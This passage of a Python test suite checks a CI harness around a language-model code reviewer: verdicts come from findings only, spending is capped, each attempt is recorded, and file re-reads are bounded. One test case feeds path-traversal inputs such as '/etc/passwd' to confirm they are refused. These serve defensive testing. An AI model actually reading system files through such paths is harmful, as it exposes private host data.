    saved = os.environ.get("GITHUB_STEP_SUMMARY")
    real_urlopen = urllib.request.urlopen

    def no_request(*a, **k):
        raise AssertionError("derive made a request")
    with tempfile.TemporaryDirectory() as d:
        summary = os.path.join(d, "summary")
        os.environ["GITHUB_STEP_SUMMARY"] = summary

        def run(obj):
            f = os.path.join(d, "answer.json")
            with open(f, "w", encoding="utf-8") as g:
                g.write(obj if isinstance(obj, str) else json.dumps(obj))
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc = ask.main(["ask.py", "derive", f])
            return rc, json.load(open(f, encoding="utf-8")), err.getvalue()
        usage = {"input_tokens": 5, "output_tokens": 7}
        urllib.request.urlopen = no_request
        try:
            rc, got, err = run({"is_error": False, "result": clean, "usage": usage, "total_cost_usd": 0.5})
            body = json.loads(got.get("result") or "{}")
            if rc != 0 or body.get("verdict") != "clean" or got.get("usage") != usage or got.get("total_cost_usd") != 0.5 or err:
                fault("an answer file was not rewritten to its derived verdict with its usage kept (%s %r)" % (rc, got))
            rc, got, err = run({"is_error": False, "result": answer([finding("blocking")], intro, verdict="clean")})
            if json.loads(got.get("result") or "{}").get("verdict") != "blocking":
                fault("an answer file carrying the model's own `clean` over a blocking finding was not a refusal")
            rc, got, err = run({"is_error": False, "result": "", "structured_output": json.loads(answer([finding("advisory")]))})
            if json.loads(got.get("result") or "{}").get("verdict") != "advisory" or "structured_output" in got:
                fault("an answer the tool left as structured output was not read from it")
            rc, got, err = run({"is_error": False, "result": "Done: nothing blocks this.",
                                "structured_output": json.loads(answer([finding("blocking")], intro))})
            if json.loads(got.get("result") or "{}").get("verdict") != "blocking":
                fault("the tool's structured answer was passed over for the text beside it")
            rc, got, err = run({"is_error": False, "result": {"findings": []}})
            if rc != 0 or not got.get("is_error") or got.get("subtype") != "no_verdict":
                fault("an answer that is not text cleared something or raised (%s %r)" % (rc, got))
            rc, got, err = run({"is_error": False, "result": '{"findings": [{"severity": "advisory", "text": "the p',
                                "stop_reason": "max_tokens", "usage": usage})
            if not got.get("is_error") or got.get("subtype") != "truncated" or got.get("usage") != usage:
                fault("an answer file cut off for length cleared something (%r)" % got)
            rc, got, err = run({"is_error": True, "subtype": "error_max_turns",
                                "result": json.dumps({"verdict": "clean", "review": said})})
            if not got.get("is_error") or got.get("result") or got.get("subtype") != "error_max_turns":
                fault("a read the tool failed kept an object the model's own verdict could be read from (%r)" % got)
            rc, got, err = run("not json")
            if not got.get("is_error") or got.get("subtype") != "no_answer":
                fault("an answer file that is not JSON was not no answer (%r)" % got)
            # A second shortfall is a refusal that says what it lacked (F(2)).
            f = os.path.join(d, "answer.json")
            for what, content, want, says in (
                    ("a second shortfall", answer([finding("needs-context", "n", ["check.sh"])]), "blocking",
                     "incomplete read: needed check.sh"),
                    ("a second shortfall naming no fetchable path", answer([finding("needs-context", "n", ["../x"])]),
                     "blocking", "incomplete read: needed files it did not name as paths"),
                    ("a clean re-read", clean, "clean", None)):
                rc, got, err = run({"is_error": False, "result": content})
                with contextlib.redirect_stderr(io.StringIO()):
                    ask.main(["ask.py", "incomplete", f])
                body = json.loads(json.load(open(f, encoding="utf-8")).get("result") or "{}")
                if body.get("verdict") != want or (says and not any(x.get("severity") == "blocking" and x.get("text") == says
                                                                     for x in body.get("findings", []))):
                    fault("%s was signed %s, not %s%s (%s)" % (what, body.get("verdict"), want,
                                                              " saying %r" % says if says else "", body))
        except AssertionError as e:
            fault("deriving a verdict reached for the network: %s" % e)
        finally:
            urllib.request.urlopen = real_urlopen
        wrote = open(summary, encoding="utf-8").read() if os.path.exists(summary) else ""
        if saved is None:
            os.environ.pop("GITHUB_STEP_SUMMARY", None)
        else:
            os.environ["GITHUB_STEP_SUMMARY"] = saved
    if "derived clean from 0 finding(s)" not in wrote or "the model's own verdict field was ignored" not in wrote:
        fault("the job's summary did not say what was derived, or that the model's own verdict was ignored (%r)"
              % wrote[:120])

    bad += _check_attempts(ask, quiet)
    bad += _check_spending(ask, path, quiet)

    # The shape goes to the job's summary alone: never to stderr, where why()
    # reads 429 as a rate limit, and never at the cost of a verdict.
    long_reply = reply(content=clean + " " + "x" * 429)
    with tempfile.TemporaryDirectory() as d:
        summary = os.path.join(d, "summary")
        for target in (summary, os.path.join(d, "no", "such", "dir")):
            os.environ["GITHUB_STEP_SUMMARY"] = target
            heard = io.StringIO()
            try:
                with contextlib.redirect_stderr(heard):
                    ask.shape(long_reply)
            except Exception as e:  # noqa: BLE001
                fault("the answer's shape raised %s, which would cost a verdict" % type(e).__name__)
            if heard.getvalue():
                fault("the answer's shape reached stderr, where why() reads its numbers: %r"
                      % heard.getvalue()[:80])
        if saved is None:
            os.environ.pop("GITHUB_STEP_SUMMARY", None)
        else:
            os.environ["GITHUB_STEP_SUMMARY"] = saved
        wrote = open(summary, encoding="utf-8").read() if os.path.exists(summary) else ""
    if "1 answer object(s)" not in wrote:
        fault("the answer's shape did not reach the job's summary (%r)" % wrote[:80])
    got, _ = ask.answer(reply(), pinned)
    if (got.get("usage"), got.get("total_cost_usd")) != ({"input_tokens": 900, "output_tokens": 40}, 0.0021):
        fault("the tokens and cost not carried to the spend line (%s)" % got)
    provider = {"effort_param": "reasoning.effort", "extra": {"provider": {"data_collection": "deny"}}}
    body = ask.build({"model": pinned, "effort": "high"}, provider, "s", "p", {"type": "object"})
    if body.get("reasoning") != {"effort": "high"} or "reasoning_effort" in body:
        fault("the effort not put where the registry says the provider takes it (%s)" % body)
    if body.get("provider") != {"data_collection": "deny"} or "models" in body or body.get("model") != pinned:
        fault("a body that is not one pinned model with the registry's extras (%s)" % body)
    if ask.build({"model": pinned, "effort": "high"}, {}, "s", "p", {}).get("reasoning_effort") != "high":
        fault("a provider that names no effort_param not given the standard reasoning_effort")
    # With no credential it refuses before any request, and says so.
    env = dict((k, v) for k, v in os.environ.items() if k != "OPENROUTER_API_KEY")
    with tempfile.TemporaryDirectory() as d:
        open(os.path.join(d, "system.txt"), "w").write("s")
        p = subprocess.run([sys.executable, path, REGISTRY, ORDINARY_ROLE, os.path.join(d, "system.txt"),
                            "{}", "60"], input="p", capture_output=True, text=True, timeout=30, env=env)
    try:
        heard = json.loads(p.stdout)
    except ValueError:
        heard = {}
    if p.returncode != 1 or heard.get("subtype") != "no_credential" or not heard.get("is_error"):
        fault("with no credential it answered %s %r, not a refusal before any request"
              % (p.returncode, p.stdout.strip()[:200]))
    if not bad and not quiet:
        print("ok: the OpenAI-compatible caller takes an answer only from the model it pinned, hands it on as "
              "written, and makes the one verdict from the findings alone — the model's own word and its "
              "prose read for nothing, any blocking finding a refusal however the answer is wrapped, cut "
              "or broken, and a missing, malformed, unknown-severity or cut-off answer clearing nothing "
              "(%d cases, and the file mode run with the network refused) — writes the answer's shape to "
              "the summary and never to stderr, carries tokens and cost to the spend line, puts the effort "
              "where the registry says, and refuses before any request with no credential" % len(cases))
    return bad


# Each rule of the derivation, removed in turn from a copy of model-registry/ask.py
# (what is removed, the text in the file, what stands in its place): the tests
# above must fail on every copy, or the rule is held by nothing.
CALLER_LOOSENINGS = (
    ("the model's own verdict word over its findings",
     'blocked = any(severity(f) == "blocking" for a in found for f in _listed(a))',
     'blocked = (own[-1:] == ["blocking"]) if own else any(severity(f) == "blocking" for a in found for f in _listed(a))'),
    ("a blocking finding among advisories lost",
     'blocked = any(severity(f) == "blocking" for a in found for f in _listed(a))',
     'blocked = all(severity(f) == "blocking" for a in found for f in _listed(a))'),
    ("advisory findings made a clean read", '{"verdict": "advisory" if findings else "clean"', '{"verdict": "clean"'),
    ("a finding of unknown severity cleared", 'severity(f) not in SEVERITIES or not str(f.get("text") or "").strip()',
     'not str(f.get("text") or "").strip()'),
    ("a read with no review cleared", 'or not isinstance(a.get("review"), str) for a in found)', 'for a in found)'),
    ("an answer cut off for length cleared",
     '    if cut:\n        return None, ("truncated", "the model ran out of room before its answer ended, so its verdict is not taken")\n    findings =',
     '    findings ='),
    ("a refusal lost once its answer will not decode", '"blocking"\', re.I)', '"blocking_"\', re.I)'),
    ("prose beside a clearance taken", "if len(found) > 1 or beside(prose):", "if len(found) > 1:"),
    ("the model's own blocking taken for a clearance", 'if "blocking" in own:', "if False:"),
    ("an answer with no findings object taken as clean",
     'return None, ("no_verdict", "the model answered no findings object")',
     'return {"verdict": "clean", "review": "", "findings": []}, None'),
    ("a blocking finding spelt Blocking lost", '.strip().lower() if isinstance(f, dict)', '.strip() if isinstance(f, dict)'),
    ("the model's own verdict not named as ignored", '"ignored": ["verdict"] if own else []}, None', '"ignored": []}, None'),
    ("a review published without end", "REVIEW_CAP = 40000", "REVIEW_CAP = 40000000"),
    ("a finding's text published without end", "FINDING_CAP = 500", "FINDING_CAP = 500000"),
    ("any number of findings published", "FINDINGS_SHOWN = 30", "FINDINGS_SHOWN = 3000"),
    ("the blocking findings listed last", 'typed.sort(key=lambda f: {"blocking": 0, "needs-context": 1, "advisory": 2}.get(f["severity"], 3))', "pass"),
    ("the findings left out not counted", "max(0, len(typed) - FINDINGS_SHOWN)", "0"),
    ("a refusal's review published without end", '**({"review": _cut(review, REVIEW_CAP)} if review else {})', '**({"review": review} if review else {})'),
    ("a clean or advisory review published without end", '"review": _cut(found[0]["review"], REVIEW_CAP)', '"review": found[0]["review"]'),
    ("a read the tool failed left holding the model's JSON", '                obj["result"] = ""', "                pass"),
    ("the text beside the tool's own answer read in its place",
     'content = json.dumps(structured) if isinstance(structured, dict) else obj.get("result")',
     'content = obj.get("result") or (json.dumps(structured) if isinstance(structured, dict) else None)'),
    ("an answer that is not text left to raise", 'content = content if isinstance(content, str) else ""', "pass"),
    # A read short of context (decision 0014, F(2)).
    ("a shortfall taken as a clean read", '    if short:\n', '    if False:\n'),
    ("a shortfall naming no file taken", '            or any(severity(f) == "needs-context" and not _files(f) for f in findings)):', '            ):'),
    ("any path a shortfall names fetched", "            if PATH.fullmatch(p) and p not in out:", "            if p not in out:"),
    ("a shortfall's files unbounded", "    return out[:NEEDED]", "    return out"),
    ("a second shortfall left unsigned", '    if not isinstance(got, dict) or got.get("verdict") != "needs-context":\n        return', '    return'),
    # One record per attempt (decision 0014, A).
    ("an attempt never closed counted as resolved", 'a["unresolved"] = not a.get("closed") or not a.get("settled", True)', 'a["unresolved"] = False'),
    ("a lost response counted as settled", 'outcome, sent, settled = "stopped, response lost", True, False', 'outcome, sent, settled = "stopped, response lost", True, True'),
    ("an unknown cost counted as nothing", "        else:\n            t[1] += 1", "        else:\n            pass"),
    ("plan added to cash", 't = totals.setdefault(a.get("billing") or "unknown", [0.0, 0])', 't = totals.setdefault("cash", [0.0, 0])'),
    ("a budget refusal counted as sent", '"budget_refused": ("budget refused", False, True),', '"budget_refused": ("budget refused", True, True),'),
    ("what the provider returned not kept", '"generation": resp.get("id") if isinstance(resp, dict) else None,', '"generation": None,'),
    ("what a request was checked against kept from the record", '"bound": most, "basis": basis}', '"bound": most}'),
    ("nothing reserved before sending", '    log_event(ledger, {"attempt": attempt, "event": "reserve", "bound": most, "basis": basis})\n', ''),
    # The spending check (decision 0014, D).
    ("the spending check's refusal ignored", '    if why:\n        note("budget refused before sending', '    if False:\n        note("budget refused before sending'),
    ("the weekly limit ignored", '        caps.append(limit - data["usage_weekly"])', '        pass'),
    ("the key's own limit ignored", '        caps.append(data["limit_remaining"])', '        pass'),
    ("unknown headroom let through", 'return None, "no weekly limit is set and the key has no limit of its own, so the headroom is unknown", ""', 'return this, None, "nothing"'),
    ("the reads in flight not reserved", 'reserved = others * RUN_ATTEMPTS * bound(lim, lim["context"])', 'reserved = 0'),
    ("the reads in flight taken as none when uncounted", '        others = int(inflight)', '        others = int(inflight) if str(inflight).isdigit() else 0'),
    ("this job's unresolved attempts not reserved", '            reserved += a["bound"]', '            pass'),
    ("a key endpoint's silence taken as headroom", '        return None, "the provider\'s key endpoint did not answer, so the cash settled this week is unknown", ""', '        data = {"limit_remaining": 1000000}'),
    ("the outgoing request never checked", "    stop = outgoing(body, got)\n", "    stop = None\n"),
    ("the model swap let through", '    if body.get("model") != got["model"]:', '    if False:'),
    ("the data-collection ask not checked", '    if (body.get("provider") or {}).get("data_collection") != "deny":', '    if False:'),
    ("a request sent with the output-token limit no endpoint serves", '    _merge(body, provider.get("extra") or {})\n', '    _merge(body, provider.get("extra") or {})\n    body["max_tokens"] = 100000\n'),
    ("a request sent with the price limit no endpoint serves", '    _merge(body, provider.get("extra") or {})\n', '    _merge(body, provider.get("extra") or {})\n    _set(body, "provider.max_price", {"prompt": 0.5, "completion": 1.7})\n'),
    ("the provider's limit in the body read as an error to fall back on", '        if limited(code, said):', '        if False:'),
    ("the provider's limit over HTTP read as an error to fall back on", '        if e.code == 402 or limited("", said):', '        if False:'),
)


def _check_caller_loosenings():
    """Each rule of the derivation held by a test that fails when it is removed."""
    try:
        source, resolver = _read(CALLER), _read(os.path.join(os.path.dirname(CALLER), "resolve.py"))
    except OSError as e:
        print("  caller: %s" % e)
        return 1
    bad = 0
    for what, old, new in CALLER_LOOSENINGS:
        if source.count(old) != 1:
            print("  caller: the loosening '%s' no longer applies — rewrite it against the file as it "
                  "stands, or it proves nothing" % what)
            bad += 1
            continue
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "ask.py"), "w", encoding="utf-8") as f:
                f.write(source.replace(old, new, 1))
            with open(os.path.join(d, "resolve.py"), "w", encoding="utf-8") as f:
                f.write(resolver)
            try:
                refused = _check_caller(os.path.join(d, "ask.py"), quiet=True) > 0
            except Exception:  # noqa: BLE001  (a copy the tests cannot run is not one they pass)
                refused = True
            if not refused:
                print("  caller: with %s the caller's tests still pass — the guard for it is gone" % what)
                bad += 1
    if not bad:
        print("ok: each of %d loosenings of the derivation in %s was applied to a copy and refused by the "
              "caller's tests" % (len(CALLER_LOOSENINGS), CALLER))
    return bad


# ONE RECORD PER ATTEMPT, IN THE WORKFLOWS (decision 0014, A). Each reviewer's
# real `ask()` is run with a fake reviewer tool on PATH: a read that falls back
# leaves two records, a call that never comes back leaves one unresolved, and a
# route refused before sending leaves none. Its spend line carries them.
ATTEMPT_SPEND = '$(python3 "$reg/ask.py" record summary "$ledger" 2>/dev/null || echo "attempts: unknown")'
FAKE_CLAUDE = """#!/usr/bin/env bash
model=""
while [ $# -gt 0 ]; do [ "$1" = --model ] && model=$2; shift; done
cat > /dev/null
case "$model" in
  m-fails) echo '{"is_error":true,"subtype":"error_during_execution","result":"no"}'; exit 1 ;;
  m-hangs) sleep 30 ;;
  *) echo '{"result":"{}","total_cost_usd":0.5,"usage":{"input_tokens":3,"output_tokens":1}}' ;;
esac
"""
# (what happens, [(the model asked, the interface it is served by, seconds)], records, unresolved).
ATTEMPT_CASES = (
    ("a read that falls back", [("m-fails", "claude-code", 20), ("m-answers", "claude-code", 20)], 2, 0),
    ("a call that never comes back", [("m-hangs", "claude-code", 1)], 1, 1),
    ("a route refused before sending", [("m-answers", "carrier-pigeon", 20)], 0, 0),
)


def attempts_say(text, steps):
    """Run the file's real `ask()` on `steps`. (records, unresolved, outcomes), or None."""
    fn = _block(text, lambda l: l == "ask() {", lambda l: l == "}")
    if not fn:
        return None
    with tempfile.TemporaryDirectory() as d:
        bin_ = os.path.join(d, "bin")
        os.makedirs(bin_)
        with open(os.path.join(bin_, "claude"), "w") as f:
            f.write(FAKE_CLAUDE)
        os.chmod(os.path.join(bin_, "claude"), 0o755)
        for name in ("prompt.txt", "system.txt"):
            open(os.path.join(d, name), "w").write("x")
        body = "\n".join(l.replace("/tmp/", d + "/") for l in fn)
        calls = "\n".join("STEP_IFACE='%s' ask 'role-%d' %d || true" % (i, n, secs)
                          for n, (m, i, secs) in enumerate(steps))
        models = " ".join("role-%d) echo %s ;;" % (n, m) for n, (m, i, secs) in enumerate(steps))
        script = textwrap.dedent("""\
            set -euo pipefail
            t='{d}'; out='{d}/resp.json'; err='{d}/err.txt'; ledger='{d}/attempts.jsonl'; : > "$ledger"
            reg='{reg}'; schema='{{}}'
            inflight() {{ echo 0; }}
            resolve() {{
              case "$2" in
                model) case "$1" in {models} esac ;;
                interface) echo "$STEP_IFACE" ;;
                effort) echo max ;;
              esac
            }}
            """).format(d=d, reg=os.path.abspath(os.path.dirname(CALLER)), models=models)
        script += body + "\n" + calls + "\n"
        try:
            p = subprocess.run(["bash", "-c", script], capture_output=True, text=True, timeout=120,
                               env=dict(os.environ, PATH=bin_ + os.pathsep + os.environ.get("PATH", ""),
                                        CLAUDE_CODE_OAUTH_TOKEN="t"))
            spec = importlib.util.spec_from_file_location("ask_for_attempts", CALLER)
            ask = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(ask)
            got = ask.attempts(os.path.join(d, "attempts.jsonl"))
        except (OSError, subprocess.SubprocessError, ImportError):
            return None
    if p.returncode != 0:
        return None
    return len(got), sum(1 for a in got if a["unresolved"]), [a.get("outcome") for a in got]


def attempts_faults(text, path):
    lost = []
    for what, steps, records, unresolved in ATTEMPT_CASES:
        got = attempts_say(text, steps)
        if not got or got[:2] != (records, unresolved) or (records == 2 and got[2][0] == "answered"):
            lost.append("%s leaving %d record(s), %d unresolved, a failed call recorded as failed (it left %s)"
                        % (what, records, unresolved, got))
    span = _step_span(text, "Read it")
    r = text[span[0]:span[1]] if span else ""
    if ATTEMPT_SPEND not in r or not re.search(r'^\s*spend="\$spend; pages .*' + re.escape(ATTEMPT_SPEND), r, re.M):
        lost.append("every attempt carried to the spend line (`%s`)" % ATTEMPT_SPEND)
    return lost


ATTEMPT_LOOSENINGS = (
    ("no record opened", lambda t: t.replace('                n=$(python3 "$reg/ask.py" record open "$ledger" "$role" "$model" "$interface") || n=""\n                timeout', "                timeout", 1)),
    ("a record never closed", lambda t: t.replace('[ -z "$n" ] || python3 "$reg/ask.py" record close', '[ -n "$n" ] || python3 "$reg/ask.py" record close', 1)),
    ("a failed call recorded as answered", lambda t: t.replace('< "$t/prompt.txt" > "$out" 2> "$err" || r=$? ;;', '< "$t/prompt.txt" > "$out" 2> "$err" ;;', 1).replace('< /tmp/prompt.txt > "$out" 2> "$err" || r=$? ;;\n              openai', '< /tmp/prompt.txt > "$out" 2> "$err" ;;\n              openai', 1)),
    ("the attempts kept from the spend line", lambda t: t.replace(ATTEMPT_SPEND, "attempts: none", 1)),
)


def _check_attempt_loosenings():
    bad = 0
    for path in (REVIEW_WORKFLOW, PRODUCT_WORKFLOW):
        try:
            text = _read(path)
        except OSError as e:
            print("  wiring: %s" % e)
            return 1
        lost = attempts_faults(text, path)
        if lost:
            print("  wiring: %s must keep one record per attempt; it has lost %s" % (path, "; ".join(lost)))
            bad += 1
            continue
        for what, loosen in ATTEMPT_LOOSENINGS:
            changed = loosen(text)
            if changed == text:
                print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against the file as it "
                      "stands, or it proves nothing" % (what, path))
                bad += 1
            elif not attempts_faults(changed, path):
                print("  wiring: %s with %s passes the attempt hold — the guard for it is gone" % (path, what))
                bad += 1
    if not bad:
        print("ok: each reviewer's own ask() keeps one record per attempt — a fallback two, a call that never "
              "comes back one unresolved, a route refused before sending none — and its spend line carries them; "
              "run in %d case(s) a file, and each of %d loosenings refused" % (len(ATTEMPT_CASES), len(ATTEMPT_LOOSENINGS)))
    return bad


# THE FILES A SHORT READ ASKED FOR (decision 0014, F(2)), each reviewer's real
# `more()` run on a made-up head: a plain path that exists is added, a path out
# of the repository or of odd characters is never tried, a missing one is named,
# the re-read stops at 200 KB, and with nothing added there is no re-read.
# (what is asked, whether a re-read follows, files added, markers it must write, paths never named).
MORE_TREE = {"a.md": "page a\n", "big.md": "x" * 150000 + "\n", "b.md": "y" * 100000 + "\n"}
MORE_CASES = (
    ("a page that exists", ["a.md"], True, {"a.md"}, (), ()),
    ("paths out of the repository or of odd characters", ["../a.md", "/etc/passwd", "a b.md"], False, set(), (),
     ("../a.md", "/etc/passwd", "a b.md")),
    ("a file the change does not have", ["missing.md"], False, set(), ("missing.md: not in this change",), ()),
    ("more than the re-read holds", ["big.md", "b.md"], True, {"big.md"},
     ("b.md: 100001 bytes, left out: past the re-read limit",), ()),
)


def more_says(text, path, asked):
    """Run the file's real `more()` on `asked`. (it returned yes, the prompt it wrote), or None."""
    fn = _block(text, lambda l: l == "more() {", lambda l: l == "}")
    if not fn:
        return None
    with tempfile.TemporaryDirectory() as d:
        tree = os.path.join(d, "product")
        os.makedirs(tree)
        for f, body in MORE_TREE.items():
            open(os.path.join(tree, f), "w").write(body)
        try:
            for cmd in (["init", "-q"], ["add", "-A"], ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "t"]):
                subprocess.run(["git", "-C", tree] + cmd, check=True, capture_output=True, timeout=30)
            sha = subprocess.run(["git", "-C", tree, "rev-parse", "HEAD"], capture_output=True, text=True,
                                 check=True, timeout=30).stdout.strip()
        except (OSError, subprocess.SubprocessError):
            return None
        prompt = os.path.join(d, "prompt.txt")
        open(prompt, "w").close()
        body = "\n".join(l.replace("/tmp/", d + "/") for l in fn)
        script = "set -euo pipefail\ncd '%s'\nt='%s'\n%s\nif more %s; then echo yes; else echo no; fi\n" % (
            tree, d, body, " ".join("'%s'" % a for a in asked))
        try:
            p = subprocess.run(["bash", "-c", script], capture_output=True, text=True, timeout=60,
                               env=dict(os.environ, SHA=sha))
            wrote = open(prompt, encoding="utf-8").read()
        except (OSError, subprocess.SubprocessError):
            return None
    if p.returncode != 0 or p.stdout.strip() not in ("yes", "no"):
        return None
    return p.stdout.strip() == "yes", wrote


def more_faults(text, path):
    lost = []
    for what, asked, again, added, marks, never in MORE_CASES:
        got = more_says(text, path, asked)
        if got is None:
            lost.append("a `more()` that runs (%s)" % what)
            continue
        yes, wrote = got
        given = set(re.findall(r"^===== (\S+) =====$", wrote, re.M))
        if (yes != again or given != added or not all(m in wrote for m in marks)
                or any(n in wrote for n in never) or "<more>" not in wrote or "</more>" not in wrote):
            lost.append("%s answering %s with %s added (it answered %s with %s)"
                        % (what, "a re-read" if again else "no re-read", sorted(added),
                           "a re-read" if yes else "no re-read", sorted(given)))
    return lost


MORE_LOOSENINGS = (
    ("any path tried", lambda t: t.replace("              case \"$f\" in /*|*..*|*[!A-Za-z0-9._/-]*) continue ;; esac\n", "", 1)),
    ("the re-read unbounded", lambda t: t.replace("-gt 200000 ]; then", "-gt 2000000 ]; then", 1)),
    ("a re-read with nothing added", lambda t: t.replace('            [ "$any" = yes ]\n', "            true\n", 1)),
    ("a missing file unnamed", lambda t: t.replace(": not in this change =====", ": =====", 1)),
)


def _check_more_loosenings():
    bad = 0
    for path in (REVIEW_WORKFLOW, PRODUCT_WORKFLOW):
        try:
            text = _read(path)
        except OSError as e:
            print("  wiring: %s" % e)
            return 1
        lost = more_faults(text, path)
        if lost:
            print("  wiring: %s must add only what a short read named, once; it has lost %s" % (path, "; ".join(lost)))
            bad += 1
            continue
        for what, loosen in MORE_LOOSENINGS:
            changed = loosen(text)
            if changed == text:
                print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against the file as it "
                      "stands, or it proves nothing" % (what, path))
                bad += 1
            elif not more_faults(changed, path):
                print("  wiring: %s with %s passes the re-read hold — the guard for it is gone" % (path, what))
                bad += 1
    if not bad:
        print("ok: each reviewer's own more() adds a named file that exists, never tries a path out of the "
              "repository, names a missing one, stops at the re-read's 200 KB, and asks no re-read with nothing "
              "added; run in %d case(s) a file, and each of %d loosenings refused" % (len(MORE_CASES), len(MORE_LOOSENINGS)))
    return bad


# THE CONTEXT PILOT, ON THE REAL TREE (decision 0014, F(1) and order item 4).
# The selector is run on this repository as it stands, with a one-line change:
# a README-only change stays near 60 KB and a one-line code change near 120 KB,
# while a risky change still gets every file whole. A code read carries the
# registry; a words read names it as left out with its size. The bounds are the
# pilot's: a tree that outgrows them turns this red, for the month review.
CONTEXT_WORDS_MAX = 60000
CONTEXT_CODE_MAX = 120000


def _check_context(path=None, quiet=False):
    path = path or CONTEXT
    bad = 0

    def fault(what):
        nonlocal bad
        if not quiet:
            print("  context: %s" % what)
        bad += 1
    try:
        spec = importlib.util.spec_from_file_location("context", path)
        ctx = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(ctx)
        tree = [f for f in subprocess.run(["git", "ls-files", "-z"], capture_output=True, check=True,
                                          timeout=30).stdout.decode("utf-8").split("\0") if f]
    except (OSError, ImportError, SyntaxError, subprocess.SubprocessError) as e:
        fault("could not be run: %s" % e)
        return bad

    def run(cls, touched):
        diff = "".join("diff --git a/%s b/%s\n@@ -3,1 +3,1 @@\n-a line\n+a line, changed\n" % (f, f) for f in touched)
        picked = ctx.select(cls, tree, touched, diff)
        given = {re.split(r"[,:]", m)[0]: b for m, t, b in picked if t is not None}
        left = [m for m, t, b in picked if t is None]
        return given, left, sum(b for m, t, b in picked if t is not None) + len(diff.encode("utf-8"))
    pool = sorted(f for f in tree if re.search(r"\.(md|sh|py|ya?ml)$", f) or f == REGISTRY)
    try:
        given, left, size = run("words", ["README.md"])
        if size > CONTEXT_WORDS_MAX:
            fault("a README-only change is given %d bytes, past the pilot's %d" % (size, CONTEXT_WORDS_MAX))
        if not any(m.startswith("%s: " % REGISTRY) and re.search(r": \d+ bytes, left out", m) for m in left):
            fault("a words read does not name %s as left out with its size" % REGISTRY)
        given, left, size = run("code", ["HOW-WE-BUILD.md"])
        if size > CONTEXT_CODE_MAX:
            fault("a one-line code change is given %d bytes, past the pilot's %d" % (size, CONTEXT_CODE_MAX))
        for want, why in ((REGISTRY, "a code read carries the registry (F(1))"),
                          ("check.sh", "its partner"), ("library/reviewer.md", "a page that names it"),
                          ("README.md", "the README's index")):
            if want not in given:
                fault("a one-line change to HOW-WE-BUILD.md is not given %s: %s" % (want, why))
        given, left, size = run("words", ["library/rulebook-files.md"])
        if "check.sh" not in given:
            fault("a change to library/rulebook-files.md is not given check.sh, its partner")
        given, left, size = run("risky", ["check.sh"])
        if sorted(given) != pool or left:
            fault("a risky change is not given every page whole and the registry (missing %s)"
                  % sorted(set(pool) - set(given))[:5])
        # A touched file past the pilot's limit is given the sections it touches.
        big = "# Big\n\n" + "".join("## Part %d\n\n%s\n" % (i, "words " * 2000) for i in range(8))
        picked = ctx.select("words", ["HOW-WE-BUILD.md", "big.md"], ["big.md"],
                            "diff --git a/big.md b/big.md\n@@ -30,1 +30,1 @@\n-a\n+b\n",
                            read=lambda f: big if f == "big.md" else "page\n")
        part = [b for m, t, b in picked if m.startswith("big.md")]
        if len(part) != 1 or not 0 < part[0] < len(big) // 2:
            fault("a touched file past %d bytes was not given as the sections its hunks fall in (%s)"
                  % (ctx.WHOLE, part))
    except Exception as e:  # noqa: BLE001
        fault("the selector raised %s" % type(e).__name__)
    if not bad and not quiet:
        print("ok: the context pilot gives a README-only change at most %d bytes and a one-line code change at most "
              "%d, with its partners, the pages naming it and on a code read the registry, names every other file "
              "with its size, gives a large file the sections it touches, and gives a risky change every file whole"
              % (CONTEXT_WORDS_MAX, CONTEXT_CODE_MAX))
    return bad


# GITHUB'S EXPRESSION LIMIT (#153's merge): a block scalar carrying `${{ }}` is
# one expression to GitHub, refused past 21,000 characters, and a workflow it
# refuses loads not at all: no job runs, a push leaves a failed run of no jobs,
# and every ask on `main` started nothing until the expression moved to `env:`.
EXPRESSION_MAX = 21000


def expression_faults(text):
    """Each block scalar (`run: |` and the like) that carries an expression past GitHub's limit."""
    lines, out = text.splitlines(), []
    for i, line in enumerate(lines):
        m = re.match(r"^(\s*)(?:- )?[\w-]+: [|>][-+]?\s*$", line)
        if not m:
            continue
        body = []
        for l in lines[i + 1:]:
            if l.strip() and len(l) - len(l.lstrip()) <= len(m.group(1)):
                break
            body.append(l)
        cut = min((len(l) - len(l.lstrip()) for l in body if l.strip()), default=0)
        block = "\n".join(l[cut:] for l in body).strip("\n")
        if "${{" in block and len(block) > EXPRESSION_MAX:
            out.append("line %d, %d characters" % (i + 1, len(block)))
    return out


def _check_expressions(quiet=False):
    """No workflow here carries an expression GitHub would refuse to load."""
    bad = 0
    for path in sorted(glob.glob(".github/workflows/*.yml")):
        got = expression_faults(_read(path))
        if got:
            bad += 1
            if not quiet:
                print("  workflow: %s carries an expression in a block past GitHub's %d characters (%s), so "
                      "GitHub loads none of it; move the expression to `env:`" % (path, EXPRESSION_MAX, "; ".join(got)))
    if not bad and not quiet:
        print("ok: no workflow carries an expression in a block past GitHub's %d characters" % EXPRESSION_MAX)
    return bad


# GLM DOWN, AND HE IS TOLD AT ONCE (his ruling, 6 October 2026). Nothing stands
# behind GLM, so a read that did not happen, for any reason but his own budget,
# opens one issue that @-mentions him or adds to the open one. Held by running
# the step's own script against a fake `gh`.
ALERT_STEP = "Tell the Chairman the reviewer is down"
ALERT_IF = "if: steps.read.outcome == 'failure' && !startsWith(steps.read.outputs.why, 'budget refused')"


def _alert_step(text):
    """The alert step's text, to the next step or the end of its job."""
    span = _step_span(text, ALERT_STEP)
    if not span:
        return ""
    step = text[span[0]:span[1]]
    end = re.search(r"^ {0,3}\S", step[1:], re.M)
    return step[:end.start() + 1] if end else step


def alert_says(text, open_issue):
    """Run the alert step's script with a fake `gh`. The calls it made, or None."""
    step = _alert_step(text)
    if not step:
        return None
    lines = step.splitlines()
    at = next((i for i, l in enumerate(lines) if l.strip() == "run: |"), None)
    if at is None:
        return None
    body = textwrap.dedent("\n".join(lines[at + 1:]))
    with tempfile.TemporaryDirectory() as d:
        bin_ = os.path.join(d, "bin")
        os.mkdir(bin_)
        log = os.path.join(d, "calls")
        with open(os.path.join(bin_, "gh"), "w", encoding="utf-8") as f:
            f.write('#!/usr/bin/env bash\nprintf "%%s\\n" "$*" >> %s\n'
                    'case "$1 $2" in "issue list") printf "%%s" "$OPEN_ISSUE" ;; esac\n' % shlex.quote(log))
        os.chmod(os.path.join(bin_, "gh"), 0o755)
